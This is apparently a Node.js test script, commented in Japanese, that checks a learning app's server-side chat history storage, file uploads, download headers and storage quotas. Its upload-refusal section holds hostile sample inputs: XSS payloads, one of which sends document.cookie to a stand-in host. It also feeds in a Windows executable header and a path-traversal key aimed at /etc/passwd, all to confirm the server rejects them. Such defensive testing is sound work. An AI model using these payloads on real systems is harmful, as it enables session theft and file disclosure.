/* ══════════════════════════════════════════════════════════════════════
   vqstore.cjs — 置き場所（2026-08-19）の 確認

   訴え:「ストレージを 外部のもの 使わないと、写真も 動画も ファイルも
          扱えない。しかも Lumi の 会話履歴も 残せなくなる。」

   実測して 分かったこと:
     ・写真と動画は **もう動いていた**（D1 に 分割して 入っている）
     ・**ファイル（PDF・音声・テキスト）は 本当に 扱えなかった** … 415 で必ず断っていた
     ・**会話の一覧と本文は 端末の中だけ** … localStorage 上限 4.4MB に対し
       すでに 4.6MB 使っており、増えるほど 静かに 消えていた
     ・1 人あたりの上限が **1TB** … いまの置き場所（D1・無料枠 5GB）の 200 倍

   ここで 確かめること:
     ① 会話を サーバへ 置ける／引ける／消せる／他人のものは 見えない
     ② 大きすぎる会話は **黙って切らずに 断る**
     ③ ファイル（PDF / MP3 / WAV / TXT / CSV / JSON / ZIP）を あげられる
     ④ **HTML と SVG は 受けない**（受けると 乗っ取りになる）
     ⑤ 落とすものは attachment、見せてよいものは inline
     ⑥ 上限が 画面へ 正しく返る（1TB と 嘘をつかない）

   使い方: node vqstore.cjs          （ローカル 8791 を 既定にする）
           VQ_API=... node vqstore.cjs
   ══════════════════════════════════════════════════════════════════════ */
"use strict";
const BASE = process.env.VQ_API || "http://127.0.0.1:8791";
if (!/127\.0\.0\.1|localhost|-dev\./.test(BASE)) {
  console.error("本番では実行しません。");
  process.exit(2);
}

let pass = 0, fail = 0; const bad = [];
const ok = (n, c, x) => {
  if (c) { pass++; console.log("  ok   " + n); }
  else { fail++; bad.push(n); console.log("  NG   " + n + (x !== undefined ? "  → " + JSON.stringify(x).slice(0, 300) : "")); }
};
const 節 = (t) => console.log("\n══ " + t + " ══");

async function api(method, path, body, token) {
  const h = { "Content-Type": "application/json" };
  if (token) h.Authorization = "Bearer " + token;
  const r = await fetch(BASE + path, { method, headers: h,
    body: body === undefined ? undefined : JSON.stringify(body) });
  const t = await r.text();
  let data = null; try { data = t ? JSON.parse(t) : null; } catch (e) { data = { raw: t.slice(0, 200) }; }
  return { status: r.status, data: data || {} };
}
async function あげる(bytes, name, token) {
  const h = { "Content-Type": "application/octet-stream" };
  if (token) h.Authorization = "Bearer " + token;
  /* ★ 見出しに 日本語は そのまま 載らない（実測: fetch が その場で 例外）。
     画面側と 同じく encodeURIComponent して 送る。 */
  if (name) h["X-File-Name"] = encodeURIComponent(name);
  const r = await fetch(BASE + "/api/upload/file", { method: "POST", headers: h, body: bytes });
  const t = await r.text();
  let data = null; try { data = t ? JSON.parse(t) : null; } catch (e) { data = { raw: t.slice(0, 200) }; }
  return { status: r.status, data: data || {} };
}
async function 人を作る(印) {
  const nick = 印 + Date.now().toString(36).slice(-6) + Math.floor(Math.random() * 90 + 10);
  const r = await api("POST", "/api/auth/register",
    { gradePrefix: "H1", nickname: nick, password: "DevStore#2026a", tosAccepted: true, tosVersion: "1" });
  if (!r.data.token) throw new Error("検証アカウントを作れません: " + JSON.stringify(r.data).slice(0, 200));
  return { nick, token: r.data.token };
}

const T = (s) => new TextEncoder().encode(s);
const U = (a) => new Uint8Array(a);

(async () => {
  console.log("接続先: " + BASE);
  const 私 = await 人を作る("stA");
  const 他 = await 人を作る("stB");
  console.log("検証アカウント: " + 私.nick + " / " + 他.nick);

  /* ══════════════════════════════════════════════════════════════ */
  節("① 会話を サーバへ 残す");

  const 空 = await api("GET", "/api/chat/sessions", undefined, 私.token);
  ok("はじめは 0 本", 空.status === 200 && (空.data.sessions || []).length === 0, 空.data);

  const 本文A = JSON.stringify([
    { id: "m1", role: "user", text: "ことわざを 3 つ 教えて" },
    { id: "m2", role: "ai", text: "石の上にも三年 / 継続は力なり / 塵も積もれば山となる" }
  ]);
  const 置く = await api("POST", "/api/chat/sessions", {
    sessions: [
      { id: "ses-a", title: "ことわざの話", body: 本文A, updatedAt: 1000, meta: { kind: "lumi_voice" } },
      { id: "ses-b", title: "英単語", body: JSON.stringify([{ id: "m1", role: "user", text: "clerk の意味" }]), updatedAt: 2000 }
    ]
  }, 私.token);
  ok("2 本 置けた", 置く.status === 200 && (置く.data.savedIds || []).length === 2, 置く.data);

  const 一覧 = await api("GET", "/api/chat/sessions", undefined, 私.token);
  const L = 一覧.data.sessions || [];
  ok("一覧に 2 本 出る", L.length === 2, L.map((x) => x.id));
  ok("一覧は 新しい順", L[0] && L[0].id === "ses-b", L.map((x) => x.id));
  ok("一覧に 本文は 付けない（軽く返す）", L.every((x) => x.body === undefined), L[0]);
  ok("一覧に 大きさは 出る", L.every((x) => x.bytes > 0), L.map((x) => x.bytes));
  ok("見出しの 付け足しも 残る", (L.find((x) => x.id === "ses-a") || {}).meta?.kind === "lumi_voice", L[0]);

  const 全部 = await api("GET", "/api/chat/sessions?full=1", undefined, 私.token);
  const F = (全部.data.sessions || []).find((x) => x.id === "ses-a");
  ok("full=1 で 本文も 返る", F && F.body === 本文A, F && String(F.body).slice(0, 80));

  const 一本 = await api("GET", "/api/chat/sessions?id=ses-a", undefined, 私.token);
  ok("id 指定で 1 本だけ 引ける", 一本.status === 200 && 一本.data.session?.body === 本文A, 一本.data.session);

  /* 上書き — 新しいほうが 勝つ */
  const 新本文 = JSON.stringify([{ id: "m1", role: "user", text: "書き足した" }]);
  await api("POST", "/api/chat/sessions",
    { sessions: [{ id: "ses-a", title: "ことわざの話（続き）", body: 新本文, updatedAt: 3000 }] }, 私.token);
  const 後 = await api("GET", "/api/chat/sessions?id=ses-a", undefined, 私.token);
  ok("新しいほうで 上書きされる", 後.data.session?.body === 新本文, 後.data.session?.body);

  /* 古いものは 勝たない（別の端末が 遅れて 送ってきた場合） */
  await api("POST", "/api/chat/sessions",
    { sessions: [{ id: "ses-a", title: "ふるい", body: JSON.stringify([{ id: "x" }]), updatedAt: 500 }] }, 私.token);
  const 後2 = await api("GET", "/api/chat/sessions?id=ses-a", undefined, 私.token);
  ok("古い版で 上書きされない（別端末の 遅れ）", 後2.data.session?.body === 新本文, 後2.data.session?.body);

  /* ══════════════════════════════════════════════════════════════ */
  節("② 他人のものは 見えない");
  const 他の一覧 = await api("GET", "/api/chat/sessions", undefined, 他.token);
  ok("他人には 1 本も 見えない", (他の一覧.data.sessions || []).length === 0, 他の一覧.data);
  const 他が引く = await api("GET", "/api/chat/sessions?id=ses-a", undefined, 他.token);
  ok("他人が id を 知っていても 引けない", 他が引く.data.session === null, 他が引く.data);
  const 札なし = await api("GET", "/api/chat/sessions");
  ok("ログインなしは 401", 札なし.status === 401, 札なし.status);

  /* ══════════════════════════════════════════════════════════════ */
  節("③ 消したら 他の端末でも 消える");
  const 消す = await api("DELETE", "/api/chat/sessions?id=ses-b", undefined, 私.token);
  ok("消せた", 消す.status === 200, 消す.data);
  const 消した後 = await api("GET", "/api/chat/sessions", undefined, 私.token);
  const B = (消した後.data.sessions || []).find((x) => x.id === "ses-b");
  ok("消した印が 付く（他の端末へ 伝わる）", !!B && B.deletedAt > 0, B);
  ok("消したものは 中身を 残さない", !!B && B.bytes <= 2, B && B.bytes);

  /* ══════════════════════════════════════════════════════════════ */
  節("④ 大きすぎる会話は 黙って切らずに 断る");
  /* ★ 上限は **バイト**で 見る。日本語は 1 文字 3 バイトなので
     600,000 文字 = 1.8MB。文字数で 見ていると ここを 通してしまう（実測）。 */
  const でかい = JSON.stringify([{ id: "m1", text: "あ".repeat(600000) }]);   /* 約 1.8MB */
  const 断り = await api("POST", "/api/chat/sessions",
    { sessions: [{ id: "ses-big", title: "でかい", body: でかい, updatedAt: 9000 }] }, 私.token);
  ok("断られた理由が 返る", 断り.status === 200 && (断り.data.rejected || []).length === 1, 断り.data);
  ok("断ったものは 置かれていない", !(断り.data.savedIds || []).includes("ses-big"), 断り.data.savedIds);
  const 大の後 = await api("GET", "/api/chat/sessions?id=ses-big", undefined, 私.token);
  ok("切り詰めた形で 入っていない", 大の後.data.session === null, 大の後.data.session);

  /* ══════════════════════════════════════════════════════════════ */
  節("⑤ ファイルを あげられる（いままで 1 つも 通らなかった）");

  const 見本 = [
    ["PDF", U([0x25, 0x50, 0x44, 0x46, 0x2d, 0x31, 0x2e, 0x37, 10, 37, 226, 227, 10]), "しりょう.pdf", "application/pdf", "file"],
    ["MP3", U([0x49, 0x44, 0x33, 3, 0, 0, 0, 0, 0, 33, 84, 65]), "おと.mp3", "audio/mpeg", "file"],
    ["WAV", U([0x52, 0x49, 0x46, 0x46, 36, 0, 0, 0, 0x57, 0x41, 0x56, 0x45, 0x66, 0x6d, 0x74]), "こえ.wav", "audio/wav", "file"],
    ["TXT", T("メモです。\n2 行目。\n"), "めも.txt", "text/plain", "file"],
    ["CSV", T("名前,点\nあ,80\nい,95\n"), "てん.csv", "text/csv", "file"],
    ["JSON", T('{"a":1,"b":[2,3]}'), "data.json", "application/json", "file"],
    ["ZIP", U([0x50, 0x4b, 0x03, 0x04, 20, 0, 0, 0, 8, 0, 0, 0]), "しりょう.docx", "application/zip", "file"],
    ["PNG", U([0x89, 0x50, 0x4e, 0x47, 13, 10, 26, 10, 0, 0, 0, 13]), "え.png", "image/png", "image"]
  ];
  const 置いた鍵 = {}, 置いた置き場 = {};
  for (const [名, b, n, 期待型, 期待種] of 見本) {
    const r = await あげる(b, n, 私.token);
    const 良 = r.status === 200 && r.data.contentType === 期待型 && r.data.kind === 期待種;
    ok(名 + " を あげられる", 良, { status: r.status, ...r.data });
    if (良) { 置いた鍵[名] = r.data.key; 置いた置き場[名] = r.data.backend || ""; }
  }

  節("⑥ 受けてはいけないものは 断る（ここを 間違えると 乗っ取り）");
  const だめ見本 = [
    ["HTML", T("<html><script>alert(document.cookie)</script></html>"), "わな.html"],
    ["SVG", T('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), "わな.svg"],
    ["HTML を .txt と 名乗る", T("<script>fetch('//x/'+document.cookie)</script>"), "むがい.txt"],
    ["HTML に BOM", T("﻿<html><script>alert(1)</script>"), "むがい.txt"],
    ["実行ファイル", U([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xff, 0xff]), "わな.exe"]
  ];
  for (const [名, b, n] of だめ見本) {
    const r = await あげる(b, n, 私.token);
    ok(名 + " は 断る", r.status === 415, { status: r.status, code: r.data.code });
  }
  const 札なしであげる = await あげる(T("だれ？"), "a.txt");
  ok("ログインなしでは あげられない", 札なしであげる.status === 401, 札なしであげる.status);

  /* ══════════════════════════════════════════════════════════════ */
  節("⑦ 取り出し方（見せる／落とさせる）");
  async function 取る(key, name) {
    const u = BASE + "/api/media/" + key + (name ? "?name=" + encodeURIComponent(name) : "");
    const r = await fetch(u);
    return { status: r.status, ct: r.headers.get("content-type") || "",
             cd: r.headers.get("content-disposition") || "",
             nosniff: r.headers.get("x-content-type-options") || "",
             len: Number(r.headers.get("content-length") || 0) };
  }
  if (置いた鍵.PDF) {
    const r = await 取る(置いた鍵.PDF, "しりょう.pdf");
    ok("PDF は そのまま 見せる", r.status === 200 && /^inline/.test(r.cd), r);
    ok("PDF に 名前が 付く", /filename\*=UTF-8''/.test(r.cd), r.cd);
    ok("PDF の 種類が 正しい", r.ct === "application/pdf", r.ct);
  }
  if (置いた鍵.TXT) {
    const r = await 取る(置いた鍵.TXT, "めも.txt");
    ok("テキストは 落とさせる（画面に 出さない）", /^attachment/.test(r.cd), r);
    ok("nosniff が 付く", r.nosniff === "nosniff", r.nosniff);
  }
  if (置いた鍵.ZIP) {
    const r = await 取る(置いた鍵.ZIP, "しりょう.docx");
    ok("ZIP は 落とさせる", /^attachment/.test(r.cd), r);
  }
  if (置いた鍵.MP3) {
    const r = await 取る(置いた鍵.MP3);
    ok("音は そのまま 鳴らせる", /^inline/.test(r.cd), r);
  }
  if (置いた鍵.PNG) {
    const r = await 取る(置いた鍵.PNG);
    ok("画像は これまで通り 見せる", /^inline/.test(r.cd) && r.ct === "image/png", r);
  }
  {
    const r = await 取る("fil/../../etc/passwd");
    ok("上へ 抜けようとする鍵は 404", r.status === 404, r.status);
    const r2 = await 取る("fil/zzz.html");
    ok("html の 鍵は そもそも 通さない", r2.status === 404, r2.status);
  }

  /* ══════════════════════════════════════════════════════════════ */
  節("⑧ 上限を 画面へ 正しく返す（1TB と 嘘をつかない）");
  const 使用 = await api("GET", "/api/storage/usage", undefined, 私.token);
  const D = 使用.data;
  ok("上限が 返る", 使用.status === 200 && D.quotaBytes > 0, { status: 使用.status, q: D.quotaBytes });
  if (!D.mediaBackend || D.mediaBackend === "d1") {
    ok("R2 が 無いときの 上限は 1TB ではない", D.quotaBytes === 500 * 1024 * 1024, D.quotaBytes);
    /* ★ 1TB → 2GB（2026-08-19）。この口座は Workers 有料なので、
       枠を 超えたぶんは 止まらずに **課金される**。
       R2 の 込み枠は 10GB。1 人 1TB のままだと 1 人で 使い切って
       請求が 立つ。10GB を 何人かで 分ける前提の 数字にした。 */
    ok("R2 を 入れたあとの 1 人ぶんは 2GB", D.quotaPlannedBytes === 2 * 1024 ** 3, D.quotaPlannedBytes);
    ok("保管庫ぜんたいの 線も 返す", D.sharedDatabaseCapBytes === 3 * 1024 ** 3, D.sharedDatabaseCapBytes);
    ok("どこに置いているか 書いてある", /データベース/.test(String(D.quotaNote || "")), D.quotaNote);
  }
  /* ★ ローカルは R2 が 用意されている（miniflare）。本番は D1。
     どちらでも 同じだけ 数えられることを 確かめる。 */
  console.log("     （置き場所: " + (D.mediaBackend || "d1") + "）");
  const 明細 = D.items || [];
  const ファイル行 = 明細.find((x) => x.id === "file");
  ok("内訳に「ファイル」が 出る", !!ファイル行, 明細.map((x) => x.id));
  ok("ファイルの量が 画像と 混ざっていない", ファイル行 && ファイル行.bytes > 0 && ファイル行.count === 7,
     ファイル行);
  const 画像行 = 明細.find((x) => x.id === "image");
  ok("画像は 1 件だけ 数える", 画像行 && 画像行.count === 1, 画像行);
  /* ★ 32MB → 64MB（2026-08-19）。置き場が 3 段になり、
     R2 なら 100MB・KV なら 60MB まで 入るので、種類としての 上限を
     動画と同じ 64MB へ 上げた。実際に 通る大きさは
     「種類の上限」と「置き場の上限」の 小さいほう。 */
  ok("1 回ぶんの上限に ファイルが 載る（64MB）", (D.limits || {}).fileBytes === 64 * 1024 * 1024, D.limits);
  ok("1 会話ぶんの上限も 載る", (D.limits || {}).chatSessionBytes === 1500 * 1024, D.limits);

  /* ══════════════════════════════════════════════════════════════ */
  節("⑧-2 置き場所が 3 段になっているか（R2 → D1 → KV）");
  /* ★ この口座は Workers 有料（実測: 24 時間で 131,600 回・失敗 0。
     無料は 100,000 回で 止まる）。だから 枠を 超えても **止まらずに 課金される**。
     「無料で」を 守るには こちらで 天井を 決めて 止めるしかない。 */
  const 段 = D.backends || [];
  ok("置き場が 一覧で 返る", 段.length >= 1, 段);
  const D1段 = 段.find((x) => x.id === "d1");
  const KV段 = 段.find((x) => x.id === "kv");
  const R2段 = 段.find((x) => x.id === "r2");
  ok("データベースの 天井は 3GB", D1段 && D1段.capBytes === 3 * 1024 ** 3, D1段);
  ok("KV が 繋がっている（前は 書いてあるのに 未接続だった）", !!KV段, 段.map((x) => x.id));
  if (KV段) ok("KV の 天井は 900MB", KV段.capBytes === 900 * 1024 * 1024, KV段);
  if (R2段) ok("R2 の 天井は 10GB", R2段.capBytes === 10 * 1024 ** 3, R2段);
  ok("合計の 天井が 返る", D.sharedTotalCapBytes > 0, D.sharedTotalCapBytes);
  ok("残りが 返る", typeof D.sharedRemainingBytes === "number", D.sharedRemainingBytes);
  if (!D.mediaBackend || D.mediaBackend === "d1") {
    ok("R2 を 入れたら いくら増えるかを 返す", D.r2WouldAddBytes === 10 * 1024 ** 3, D.r2WouldAddBytes);
    ok("合計の 天井は 3GB＋900MB", D.sharedTotalCapBytes === 3 * 1024 ** 3 + 900 * 1024 * 1024,
       D.sharedTotalCapBytes);
  }
  ok("あげたものに 置き場が 記録される", !!置いた置き場.PDF, 置いた置き場);

  節("⑨ 画面側の 仕掛け（VQCLOUD）が 配られているか");
  const fs = require("fs"), path = require("path");
  const 束名 = /\/js\/(bundle-core\.[0-9a-f]{10}\.js)/.exec(
    fs.readFileSync(path.join(__dirname, "client/index.html"), "utf8"));
  ok("index.html が 束を 指している", !!束名, 束名 && 束名[1]);
  if (束名) {
    const 束 = fs.readFileSync(path.join(__dirname, "client/js", 束名[1]), "utf8");
    ok("VQCLOUD が 束に 入っている", 束.includes("VQCLOUD"));
    ok("VQIDB も まだ 入っている", 束.includes("VQIDB"));
    ok("AR Board の 土台も まだ 入っている", 束.includes("VQB.RUNTIME"));
  }
  const 素 = fs.readFileSync(path.join(__dirname, "client/core/store/cloud.js"), "utf8");
  ok("会話の鍵だけを 見ている", 素.includes("app.chat.sessions.v2") && 素.includes("app.chat.ses."));
  ok("同期で 読めるように 写しを 持つ", /記憶\[k\]/.test(素));
  ok("一杯でも 失わない（写しへ 逃がす）", 素.includes("場所を空ける"));
  ok("閉じる直前に 送り切る", 素.includes("pagehide"));

  console.log("\n════════════════════════════════════════════");
  console.log("  合計 " + (pass + fail) + " 件 / 通った " + pass + " / 落ちた " + fail);
  if (bad.length) { console.log("  落ちたもの:"); bad.forEach((b) => console.log("   - " + b)); }
  console.log("════════════════════════════════════════════");
  process.exit(fail ? 1 : 0);
})().catch((e) => { console.error("落ちました: " + (e && e.stack || e)); process.exit(1); });
